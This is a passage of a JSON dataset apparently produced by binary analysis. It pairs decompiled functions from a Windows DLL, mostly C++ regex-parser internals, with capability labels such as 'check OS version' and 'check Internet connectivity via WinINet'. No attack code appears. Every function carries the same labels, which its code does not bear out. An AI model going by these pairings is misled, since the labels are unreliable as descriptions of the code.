== 0 && ((*piVar4 == 0x28 || (*piVar4 == 0x29)))) ||\n                    (((param_1[0x14] & 0x10) == 0 && ((*piVar4 == 0x7b || (*piVar4 == 0x7d)))))))) {\n                    *param_1 = piVar4;\n                }\n                *param_1 = *param_1 + 1;\n            }\n            fcn.100054a0();\ncode_r0x10006a39:\n            in_EAX = fcn.100078c0();\n        }\n        else if (in_EAX == 0x5c) {\n            piVar4 = *param_1;\n            if (piVar4 != param_1[2]) {\n                if (((*piVar4 == 0x5c) && (piVar4 = piVar4 + 1,  piVar4 != param_1[2])) &&\n                   ((((param_1[0x14] & 8) == 0 && ((*piVar4 == 0x28 || (*piVar4 == 0x29)))) ||\n                    (((param_1[0x14] & 0x10) == 0 && ((*piVar4 == 0x7b || (*piVar4 == 0x7d)))))))) {\n                    *param_1 = piVar4;\n                }\n                *param_1 = *param_1 + 1;\n            }\n            fcn.100054a0();\n            if (((param_1[0x14] & 0x80) == 0) || (*(param_1 + 0x12) != 0x62)) {\n                if (((param_1[0x14] & 0x80) == 0) || (*(param_1 + 0x12) != 0x42)) {\n                    fcn.10007750();\n                    goto code_r0x10006a39;\n                }\n                fcn.10007ab0();\n                *(param_1[10] + 4) = *(param_1[10] + 4) ^ 1;\n                in_EAX = fcn.100067a0();\n            }\n            else {\n                fcn.10007ab0();\n                in_EAX = fcn.100067a0();\n            }\n        }\n        else {\n            if (in_EAX == 0x5b) {\n                fcn.100067a0();\n                fcn.100076c0();\n                fcn.10007660(0x5d, 4);\n                goto code_r0x10006a39;\n            }\n            if (in_EAX == 0x28) {\n                fcn.100067a0();\n                cVar2 = fcn.10007820();\n                in_EAX = fcn.10007660(0x29, 5);\n                if (cVar2 != '\\0') goto code_r0x10006a39;\n            }\n            else if (in_EAX == 0x5e) {\n                fcn.100079f0();\n                in_EAX = fcn.100067a0();\n            }\n            else {\n                if (in_EAX != 0x24) {\n                    if ((((in_EAX == 0x2a) || (in_EAX == 0x2b)) || (in_EAX == 0x3f)) || (in_EAX == 0x7b))\n                    goto code_r0x10006a67;\n                    if ((in_EAX == 0x7d) && ((param_1[0x14] & 0x10000000) == 0)) goto code_r0x10006a59;\n                    if ((in_EAX == 0x5d) && ((param_1[0x14] & 0x10000000) == 0)) goto code_r0x10006a60;\n                    fcn.10007b10(*(param_1 + 0x12));\n                    fcn.100067a0();\n                    goto code_r0x10006a39;\n                }\n                fcn.10007a50();\n                in_EAX = fcn.100067a0();\n            }\n        }\n        piVar4 = param_1[0x13];\n        uVar7 = 1;\n        uVar6 = 1;\n    }\n    if (param_1[4] == NULL) {\n        if ((param_1[0x14] & 0x10000000) != 0) goto code_r0x10006829;\n        fcn.1000a231(5);\ncode_r0x10006a59:\n        fcn.1000a231(6);\ncode_r0x10006a60:\n        fcn.1000a231(4);\ncode_r0x10006a67:\n        fcn.1000a231(10);\n        pcVar1 = swi(3);\n        uVar5 = (*pcVar1)();\n        return uVar5;\n    }\ncode_r0x10006a4c:\n    return in_EAX & 0xffffff00 | uVar6;\n}\n",
        "token_count": 1600
    },
    "10006bd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10006bd0(int32_t param_1, int32_t param_2, code *param_3)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    code **ppcVar5;\n    \n    iVar2 = *(param_2 + 0xc);\n    pcVar3 = *(param_3 + 0xc);\n    *(param_3 + 0xc) = 0;\n    iVar4 = *(param_1 + 4);\n    *(param_1 + 4) = param_3;\n    *(param_3 + 0xc) = 0;\n    *(iVar4 + 0xc) = param_3;\n    piVar1 = iVar2 + 0x18;\n    iVar4 = *piVar1;\n    while (iVar4 != 0) {\n        iVar2 = *piVar1;\n        piVar1 = iVar2 + 0x18;\n        iVar4 = *(iVar2 + 0x18);\n    }\n    ppcVar5 = fcn.1000ac95(0x1c);\n    ppcVar5[5] = param_3;\n    ppcVar5[1] = 0x10;\n    ppcVar5[2] = NULL;\n    ppcVar5[3] = NULL;\n    ppcVar5[4] = NULL;\n    *ppcVar5 = vtable.std::_Node_if.0;\n    ppcVar5[6] = NULL;\n    *(iVar2 + 0x18) = ppcVar5;\n    ppcVar5[3] = pcVar3;\n    *(pcVar3 + 0x10) = *(iVar2 + 0x18);\n    return;\n}\n",
        "token_count": 396
    },
    "100072d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.100072d0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t *in_ECX;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint32_t extraout_ECX_05;\n    uint32_t extraout_ECX_06;\n    uint32_t extraout_ECX_07;\n    uint32_t extraout_ECX_08;\n    uint32_t extraout_ECX_09;\n    uint32_t extraout_ECX_10;\n    uint32_t extraout_ECX_11;\n    uint32_t extraout_ECX_12;\n    uint32_t extraout_ECX_13;\n    uint32_t extraout_ECX_14;\n    uint8_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    int32_t *in_FS_OFFSET;\n    bool bVar10;\n    int32_t var_60h;\n    uint32_t var_5ch;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint32_t var_4ch;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint32_t var_3ch;\n    int32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_24h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint8_t var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x1002ab30;\n    var_ch = *in_FS_OFFSET;\n    uVar3 = *0x10040068 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_60h = *in_ECX;\n    piVar8 = in_ECX + 1;\n    iVar5 = 0;\n    var_18h = piVar8;\n    var_14h = in_ECX;\n    fcn.10005f40(piVar8, uVar3);\n    var_50h = in_ECX[4];\n    var_1ch = in_ECX + 5;\n    var_4h = 0;\n    fcn.10007150(var_1ch);\n    var_4h = 1;\n    piVar7 = in_ECX;\n    if (0 < *(arg_8h + 0x14)) {\n        do {\n            piVar7 = var_14h;\n            iVar9 = *in_ECX;\n            cVar2 = fcn.10005050(*(arg_8h + 0xc));\n            if (cVar2 == '\\0') {\n                *piVar7 = var_60h;\n                piVar7[4] = var_50h;\n                fcn.10005e50(&var_5ch);\n                uVar3 = fcn.10005d20();\n                uVar4 = 0;\n                goto code_r0x1000758d;\n            }\n            if (iVar9 == *piVar7) {\n                iVar5 = *(arg_8h + 0x14) + -1;\n            }\n            iVar5 = iVar5 + 1;\n            in_ECX = piVar7;\n            piVar8 = var_18h;\n        } while (iVar5 < *(arg_8h + 0x14));\n    }\n    var_40h = *piVar7;\n    fcn.10005f40(piVar8);\n    var_30h = piVar8[3];\n    var_4h._0_1_ = 2;\n    fcn.10007150(piVar7 + 5);\n    var_4h = CONCAT31(var_4h._1_3_, 3);\n    iVar9 = *piVar7;\n    var_dh = 0;\n    uVar3 = fcn.10005050(*(*(arg_8h + 0x1c) + 0xc));\n    if (uVar3 != '\\0') {\n        if (arg_ch == '\\0') {\ncode_r0x1000749e:\n            uVar4 = 1;\n            goto code_r0x100074d5;\n        }\n        var_40h = *piVar7;\n        var_30h = piVar7[4];\n        fcn.10005e50(piVar7 + 1);\n        fcn.10005d20(piVar7 + 5);\n        var_dh = 1;\n    }\n    do {\n        iVar6 = iVar5;\n        if ((*(arg_8h + 0x18) != -1) && (iVar6 = iVar5 + 1,  *(arg_8h + 0x18) <= iVar5)) break;\n        *piVar7 = iVar9;\n        piVar7[4] = var_50h;\n        fcn.10005e50(&var_5ch);\n        cVar2 = fcn.10005050(*(arg_8h + 0xc));\n        if (cVar2 == '\\0') break;\n        iVar1 = *piVar7;\n        uVar3 = fcn.10005050(*(*(arg_8h + 0x1c) + 0xc));\n        if (uVar3 != '\\0') {\n            if (arg_ch == '\\0') goto code_r0x1000749e;\n            var_40h = *var_14h;\n            var_30h = var_18h[3];\n            fcn.10005e50(var_18h);\n            fcn.10005d20(var_1ch);\n            var_dh = 1;\n        }\n        bVar10 = iVar9 != iVar1;\n        iVar5 = iVar6;\n        piVar7 = var_14h;\n        iVar9 = iVar1;\n    } while (bVar10);\n    uVar4 = var_dh;\n    piVar8 = &var_40h;\n    if (var_dh == 0) {\n        piVar8 = &var_60h;\n    }\n    *var_14h = *piVar8;\n    var_18h[3] = piVar8[4];\n    fcn.10005e50(piVar8 + 1);\n    uVar3 = fcn.10005d20(piVar8 + 5);\ncode_r0x100074d5:\n    if (var_2ch != 0) {\n        uVar3 = var_24h - var_2ch >> 3;\n        if (0x1fffffff < uVar3) {\n            uVar3 = fcn.10010ddf();\n            var_2ch = extraout_ECX;\n        }\n        if (0xfff < uVar3 << 3) {\n            uVar3 = var_2ch;\n            if ((var_2ch & 0x1f) != 0) {\n                fcn.10010ddf();\n                uVar3 = extraout_ECX_00;\n            }\n            var_2ch = *(uVar3 - 4);\n            if (uVar3 <= var_2ch) {\n                var_2ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_01;\n            }\n            uVar3 = uVar3 - var_2ch;\n            if (uVar3 < 4) {\n                var_2ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_02;\n            }\n            if (0x23 < uVar3) {\n                var_2ch = fcn.10010ddf();\n            }\n        }\n        uVar3 = fcn.1000acc8(var_2ch);\n    }\n    if (var_3ch != 0) {\n        uVar3 = var_34h - var_3ch >> 2;\n        if (0x3fffffff < uVar3) {\n            uVar3 = fcn.10010ddf();\n            var_3ch = extraout_ECX_03;\n        }\n        if (0xfff < uVar3 << 2) {\n            uVar3 = var_3ch;\n            if ((var_3ch & 0x1f) != 0) {\n                fcn.10010ddf();\n                uVar3 = extraout_ECX_04;\n            }\n            var_3ch = *(uVar3 - 4);\n            if (uVar3 <= var_3ch) {\n                var_3ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_05;\n            }\n            uVar3 = uVar3 - var_3ch;\n            if (uVar3 < 4) {\n                var_3ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_06;\n            }\n            if (0x23 < uVar3) {\n                var_3ch = fcn.10010ddf();\n            }\n        }\n        uVar3 = fcn.1000acc8(var_3ch);\n    }\ncode_r0x1000758d:\n    if (var_4ch != 0) {\n        uVar3 = var_44h - var_4ch >> 3;\n        if (0x1fffffff < uVar3) {\n            uVar3 = fcn.10010ddf();\n            var_4ch = extraout_ECX_07;\n        }\n        if (0xfff < uVar3 << 3) {\n            uVar3 = var_4ch;\n            if ((var_4ch & 0x1f) != 0) {\n                fcn.10010ddf();\n                uVar3 = extraout_ECX_08;\n            }\n            var_4ch = *(uVar3 - 4);\n            if (uVar3 <= var_4ch) {\n                var_4ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_09;\n            }\n            uVar3 = uVar3 - var_4ch;\n            if (uVar3 < 4) {\n                var_4ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_10;\n            }\n            if (0x23 < uVar3) {\n                var_4ch = fcn.10010ddf();\n            }\n        }\n        uVar3 = fcn.1000acc8(var_4ch);\n    }\n    if (var_5ch != 0) {\n        uVar3 = var_54h - var_5ch >> 2;\n        if (0x3fffffff < uVar3) {\n            uVar3 = fcn.10010ddf();\n            var_5ch = extraout_ECX_11;\n        }\n        if (0xfff < uVar3 << 2) {\n            uVar3 = var_5ch;\n            if ((var_5ch & 0x1f) != 0) {\n                fcn.10010ddf();\n                uVar3 = extraout_ECX_12;\n            }\n            var_5ch = *(uVar3 - 4);\n            if (uVar3 <= var_5ch) {\n                var_5ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_13;\n            }\n            uVar3 = uVar3 - var_5ch;\n            if (uVar3 < 4) {\n                var_5ch = fcn.10010ddf();\n                uVar3 = extraout_ECX_14;\n            }\n            if (0x23 < uVar3) {\n                var_5ch = fcn.10010ddf();\n            }\n        }\n        uVar3 = fcn.1000acc8(var_5ch);\n    }\n    *in_FS_OFFSET = var_ch;\n    return uVar3 & 0xffffff00 | uVar4;\n}\n",
        "token_count": 2727
    },
    "10007d40": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall\nfcn.10007d40(char *param_1, uint param_2, uint32_t *param_3, uint32_t param_4, uint32_t *param_5, uint32_t param_6)\n\n{\n    uint32_t uVar1;\n    \n    while ((param_3 != param_5 || (param_4 != param_6))) {\n        if (*param_1 == '\\0') {\n            uVar1 = *param_3 & ~(1 << (param_4 & 0x1f));\n        }\n        else {\n            uVar1 = *param_3 | 1 << (param_4 & 0x1f);\n        }\n        *param_3 = uVar1;\n        if (param_4 < 0x1f) {\n            param_4 = param_4 + 1;\n        }\n        else {\n            param_3 = param_3 + 1;\n            param_4 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "10007e60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.10007e60(int16_t **param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    iVar2 = fcn.100088c0();\n    if (iVar2 == 0) {\n        return;\n    }\n    do {\n        if (iVar2 != 2) {\n            if ((param_1[0x11] == NULL) && ((param_1[0x14] & 0x100000) == 0)) {\n                fcn.1000a231(2);\n                goto code_r0x10007fa1;\n            }\n            if (param_1[0x13] == 0x2d) {\n                piVar3 = *param_1;\n                if (piVar3 != param_1[2]) {\n                    if (((*piVar3 == 0x5c) && (piVar3 = piVar3 + 1,  piVar3 != param_1[2])) &&\n                       ((((param_1[0x14] & 8) == 0 && ((*piVar3 == 0x28 || (*piVar3 == 0x29)))) ||\n                        (((param_1[0x14] & 0x10) == 0 && ((*piVar3 == 0x7b || (*piVar3 == 0x7d)))))))) {\n                        *param_1 = piVar3;\n                    }\n                    *param_1 = *param_1 + 1;\n                }\n                fcn.100054a0();\n                uVar5 = *(param_1 + 0x11);\n                iVar2 = fcn.100088c0();\n                if (iVar2 == 0) {\n                    if (0xff < *(param_1 + 0x11)) {\n                        fcn.10008e10(*(param_1 + 0x11));\n                        fcn.10008d80(0x2d);\n                        return;\n                    }\n                    fcn.10008d80();\n                    fcn.10008d80(0x2d);\n                    return;\n                }\n                if (iVar2 == 2) {\ncode_r0x10007fa1:\n                    fcn.1000a231(8);\n                    pcVar1 = swi(3);\n                    (*pcVar1)();\n                    return;\n                }\n                if ((param_1[0x10] & 0x800) != 0) {\n                    uVar4 = fcn.10004510(*(param_1 + 0x11));\n                    param_1[0x11] = uVar4 & 0xffff;\n                    uVar5 = fcn.10004510(uVar5);\n                    uVar5 = uVar5 & 0xffff;\n                }\n                if (*(param_1 + 0x11) < uVar5) goto code_r0x10007fa1;\n                fcn.10008ae0(uVar5, *(param_1 + 0x11));\n            }\n            else if (*(param_1 + 0x11) < 0x100) {\n                fcn.10008d80();\n            }\n            else {\n                fcn.10008e10(*(param_1 + 0x11));\n            }\n        }\n        iVar2 = fcn.100088c0();\n        if (iVar2 == 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 764
    },
    "10007fb0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.10007fb0(int32_t param_1)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    char cVar4;\n    uint16_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    int16_t *piVar8;\n    int16_t **extraout_ECX;\n    uint64_t uVar9;\n    \n    if (*(param_1 + 0x4c) == -1) {\n        uVar9 = fcn.1000a231(2);\ncode_r0x100080e9:\n        cVar4 = (**(uVar9 + 0x10))(0x103, uVar9 >> 0x20);\ncode_r0x10008061:\n        if (cVar4 == '\\0') {\n            fcn.1000a231(0x10008100);\n            goto code_r0x10008100;\n        }\n        *(param_1 + 0x44) = *(param_1 + 0x48) & 0x1f;\ncode_r0x10007fee:\n        fcn.100067a0();\n    }\n    else {\n        if (((*(param_1 + 0x50) & 0x10000) != 0) && (cVar4 = fcn.10008a70(*(param_1 + 0x48)),  cVar4 != '\\0'))\n        goto code_r0x10007fee;\n        uVar2 = *(param_1 + 0x50);\n        if ((uVar2 & 0x8000) != 0) {\n            if (*(param_1 + 0x48) == 0x61) {\n                *(param_1 + 0x44) = 7;\n            }\n            else {\n                if (*(param_1 + 0x48) != 0x62) goto code_r0x1000801b;\n                *(param_1 + 0x44) = 8;\n            }\n            goto code_r0x10007fee;\n        }\ncode_r0x1000801b:\n        iVar1 = *(param_1 + 0x48);\n        if ((iVar1 == 99) && ((uVar2 & 0x40000) != 0)) {\n            fcn.100067a0();\n            pcVar3 = **(*(param_1 + 0x3c) + 4);\n            uVar9 = CONCAT24(*(param_1 + 0x48), pcVar3);\n            if (pcVar3 != vtable.std::ctype_wchar_t_.0) goto code_r0x100080e9;\n            uVar5 = fcn.1000a251(*(param_1 + 0x48));\n            cVar4 = (uVar5 & 0x103) != 0;\n            goto code_r0x10008061;\n        }\n        if ((iVar1 == 0x78) && ((uVar2 & 0x1000) != 0)) {\n            fcn.100067a0();\n            uVar7 = 2;\ncode_r0x1000808d:\n            iVar6 = fcn.100087e0(0x10, uVar7);\n            if (iVar6 != 0) goto code_r0x10008100;\n        }\n        else {\n            if ((iVar1 == 0x75) && ((uVar2 & 0x800) != 0)) {\n                fcn.100067a0();\n                uVar7 = 4;\n                goto code_r0x1000808d;\n            }\n            if (((uVar2 & 0x2000) == 0) || (iVar6 = fcn.100087e0(8, 3),  iVar6 == 3)) {\n                cVar4 = fcn.10009230();\n                if (cVar4 == '\\0') {\n                    return 0;\n                }\n                extraout_ECX[0x11] = *(extraout_ECX + 0x12);\n                piVar8 = *extraout_ECX;\n                if (piVar8 != extraout_ECX[2]) {\n                    if (((*piVar8 == 0x5c) && (piVar8 = piVar8 + 1,  piVar8 != extraout_ECX[2])) &&\n                       ((((extraout_ECX[0x14] & 8) == 0 && ((*piVar8 == 0x28 || (*piVar8 == 0x29)))) ||\n                        (((extraout_ECX[0x14] & 0x10) == 0 && ((*piVar8 == 0x7b || (*piVar8 == 0x7d)))))))) {\n                        *extraout_ECX = piVar8;\n                    }\n                    *extraout_ECX = *extraout_ECX + 1;\n                }\n                fcn.100054a0();\n                return 1;\n            }\n            if (*(param_1 + 0x44) == 0) goto code_r0x10008100;\n        }\n    }\n    if (*(param_1 + 0x44) < 0x10000) {\n        *(param_1 + 0x44) = *(param_1 + 0x44);\n        return 1;\n    }\ncode_r0x10008100:\n    fcn.1000a231(2);\n    pcVar3 = swi(3);\n    uVar7 = (*pcVar3)();\n    return uVar7;\n}\n",
        "token_count": 1210
    },
    "10008370": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10008370(int32_t *param_1, int32_t param_2, char param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    code **ppcVar3;\n    code **ppcVar4;\n    code **ppcVar5;\n    code **ppcVar6;\n    code **ppcVar7;\n    uint *puVar8;\n    uint uVar9;\n    code *pcVar10;\n    int32_t unaff_retaddr;\n    \n    iVar1 = param_1[1];\n    if ((*(iVar1 + 4) == 6) && (*(iVar1 + 0x18) != 1)) {\n        *(iVar1 + 0x18) = *(iVar1 + 0x18) + -1;\n        fcn.10007b10(*(*(iVar1 + 0x1c) + *(iVar1 + 0x18) * 2));\n    }\n    pcVar10 = param_1[1];\n    if ((*(pcVar10 + 4) == 9) || (*(pcVar10 + 4) == 0xe)) {\n        pcVar10 = *(pcVar10 + 0x14);\n    }\n    if ((unaff_retaddr == 0) && (param_2 == 1)) {\n        ppcVar3 = fcn.1000ac95(0x14);\n        ppcVar3[1] = 0x11;\n        ppcVar3[2] = NULL;\n        ppcVar3[3] = NULL;\n        ppcVar3[4] = NULL;\n        *ppcVar3 = vtable.std::_Node_endif.0;\n        ppcVar4 = fcn.1000ac95(0x1c);\n        ppcVar4[1] = 0x10;\n        ppcVar4[2] = NULL;\n        ppcVar4[3] = NULL;\n        ppcVar4[4] = NULL;\n        *ppcVar4 = vtable.std::_Node_if.0;\n        ppcVar4[5] = ppcVar3;\n        ppcVar4[6] = NULL;\n        ppcVar5 = fcn.1000ac95(0x1c);\n        ppcVar5[1] = 0x10;\n        ppcVar5[2] = NULL;\n        ppcVar5[3] = NULL;\n        ppcVar5[4] = NULL;\n        *ppcVar5 = vtable.std::_Node_if.0;\n        ppcVar5[5] = ppcVar3;\n        ppcVar5[6] = NULL;\n        ppcVar6 = fcn.1000ac95(0x14);\n        *ppcVar6 = vtable.std::_Node_base.0;\n        ppcVar6[1] = 0x8;\n        ppcVar6[2] = NULL;\n        ppcVar6[3] = NULL;\n        ppcVar6[4] = NULL;\n        ppcVar7 = fcn.1000ac95(0x18);\n        ppcVar7[1] = 0x9;\n        ppcVar7[2] = NULL;\n        ppcVar7[3] = NULL;\n        ppcVar7[4] = NULL;\n        *ppcVar7 = vtable.std::_Node_end_group.0;\n        ppcVar7[5] = ppcVar6;\n        ppcVar5[3] = ppcVar6;\n        ppcVar6[4] = ppcVar5;\n        ppcVar6[3] = ppcVar7;\n        ppcVar7[4] = ppcVar6;\n        ppcVar7[3] = ppcVar3;\n        ppcVar4[6] = ppcVar5;\n        ppcVar3[4] = param_1[1];\n        if (*(param_1[1] + 0xc) != NULL) {\n            ppcVar3[3] = *(param_1[1] + 0xc);\n            *(*(param_1[1] + 0xc) + 0x10) = ppcVar3;\n        }\n        *(param_1[1] + 0xc) = ppcVar3;\n        param_1[1] = ppcVar3;\n        *(*(pcVar10 + 0x10) + 0xc) = ppcVar4;\n        ppcVar4[4] = *(pcVar10 + 0x10);\n        *(pcVar10 + 0x10) = ppcVar4;\n        ppcVar4[3] = pcVar10;\n        if (param_3 == '\\0') {\n            pcVar2 = ppcVar5[3];\n            uVar9 = *(pcVar10 + 0x10);\n            *(pcVar10 + 0x10) = *(pcVar2 + 0x10);\n            *(pcVar2 + 0x10) = uVar9;\n            pcVar10 = ppcVar4[3];\n            ppcVar4[3] = ppcVar5[3];\n            ppcVar5[3] = pcVar10;\n            return;\n        }\n    }\n    else {\n        ppcVar3 = fcn.1000ac95(0x18);\n        ppcVar3[1] = 0x13;\n        ppcVar3[2] = NULL;\n        ppcVar3[3] = NULL;\n        ppcVar3[4] = NULL;\n        *ppcVar3 = vtable.std::_Node_end_rep.0;\n        ppcVar3[5] = NULL;\n        puVar8 = fcn.1000ac95(0x28);\n        iVar1 = *(*param_1 + 0x18);\n        *(*param_1 + 0x18) = iVar1 + 1;\n        uVar9 = 0;\n        puVar8[1] = 0x12;\n        if (param_3 != '\\0') {\n            uVar9 = 2;\n        }\n        puVar8[3] = 0;\n        puVar8[2] = uVar9;\n        puVar8[5] = unaff_retaddr;\n        puVar8[4] = 0;\n        *puVar8 = 0x1003d2f0;\n        puVar8[6] = param_2;\n        puVar8[7] = ppcVar3;\n        puVar8[8] = iVar1;\n        puVar8[9] = 0xffffffff;\n        ppcVar3[5] = puVar8;\n        ppcVar3[4] = param_1[1];\n        if (*(param_1[1] + 0xc) != NULL) {\n            ppcVar3[3] = *(param_1[1] + 0xc);\n            *(*(param_1[1] + 0xc) + 0x10) = ppcVar3;\n        }\n        *(param_1[1] + 0xc) = ppcVar3;\n        param_1[1] = ppcVar3;\n        *(*(pcVar10 + 0x10) + 0xc) = puVar8;\n        puVar8[4] = *(pcVar10 + 0x10);\n        *(pcVar10 + 0x10) = puVar8;\n        puVar8[3] = pcVar10;\n    }\n    return;\n}\n",
        "token_count": 1659
    },
    "10008ae0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.10008ae0(int32_t param_1, uint32_t param_2, uint16_t param_3)\n\n{\n    code **ppcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uchar (*pauVar5) [16];\n    uint32_t uVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint8_t *puVar9;\n    uint32_t uVar10;\n    \n    param_2 = param_2 & 0xffff;\n    uVar10 = param_3;\n    if ((*(param_1 + 8) & 0x100) != 0) {\n        ppcVar1 = *(*(param_1 + 0xc) + 4);\n        pcVar2 = *ppcVar1;\n        if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n            param_2 = fcn.1000a294(param_2, ppcVar1 + 2);\n        }\n        else {\n            param_2 = (**(pcVar2 + 0x20))(param_2);\n        }\n        param_2 = param_2 & 0xffff;\n        ppcVar1 = *(*(param_1 + 0xc) + 4);\n        pcVar2 = *ppcVar1;\n        if (pcVar2 == vtable.std::ctype_wchar_t_.0) {\n            uVar10 = fcn.1000a294(uVar10, ppcVar1 + 2);\n        }\n        else {\n            uVar10 = (**(pcVar2 + 0x20))(uVar10);\n        }\n        uVar10 = uVar10 & 0xffff;\n    }\n    iVar3 = *(param_1 + 4);\n    if (param_2 <= uVar10) {\n        while (uVar10 < *(param_1 + 0x10)) {\n            if (*(iVar3 + 0x18) == 0) {\n                pauVar5 = fcn.1000ac95(0x20);\n                *pauVar5 = ZEXT816(0);\n                pauVar5[1] = ZEXT816(0);\n                *(iVar3 + 0x18) = pauVar5;\n            }\n            uVar6 = param_2 & 7;\n            puVar9 = (param_2 >> 3) + *(iVar3 + 0x18);\n            param_2 = param_2 + 1;\n            *puVar9 = *puVar9 | 1 << uVar6;\n            if (uVar10 < param_2) {\n                return;\n            }\n        }\n        if (uVar10 < param_2) {\n            return;\n        }\n        if (uVar10 - param_2 < *(param_1 + 0x14)) {\n            if (uVar10 < param_2) {\n                return;\n            }\n            do {\n                fcn.10008e10();\n                param_2 = param_2 + 1;\n            } while (param_2 <= uVar10);\n            return;\n        }\n        if (*(iVar3 + 0x20) == 0) {\n            puVar7 = fcn.1000ac95(0xc);\n            *puVar7 = 0;\n            puVar7[1] = 0;\n            puVar7[2] = 0;\n            *(iVar3 + 0x20) = puVar7;\n        }\n        puVar4 = *(iVar3 + 0x20);\n        uVar6 = puVar4[1];\n        if (*puVar4 < uVar6 || *puVar4 == uVar6) {\n            uVar8 = fcn.1000fe67(puVar4[2], (uVar6 + 0x10) * 2);\n            if (uVar8 == 0) {\n                fcn.1000b73a();\n                goto code_r0x10008c7a;\n            }\n            puVar4[2] = uVar8;\n            *puVar4 = uVar6 + 0x10;\n        }\n        *(puVar4[2] + puVar4[1] * 2) = param_2;\n        puVar4[1] = puVar4[1] + 1;\n        puVar4 = *(iVar3 + 0x20);\n        uVar6 = puVar4[1];\n        if (*puVar4 < uVar6 || *puVar4 == uVar6) {\n            uVar8 = fcn.1000fe67(puVar4[2], (uVar6 + 0x10) * 2);\n            if (uVar8 == 0) {\ncode_r0x10008c7a:\n                fcn.1000b73a();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n            puVar4[2] = uVar8;\n            *puVar4 = uVar6 + 0x10;\n        }\n        *(puVar4[2] + puVar4[1] * 2) = uVar10;\n        puVar4[1] = puVar4[1] + 1;\n    }\n    return;\n}\n",
        "token_count": 1164
    },
    "10008d80": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
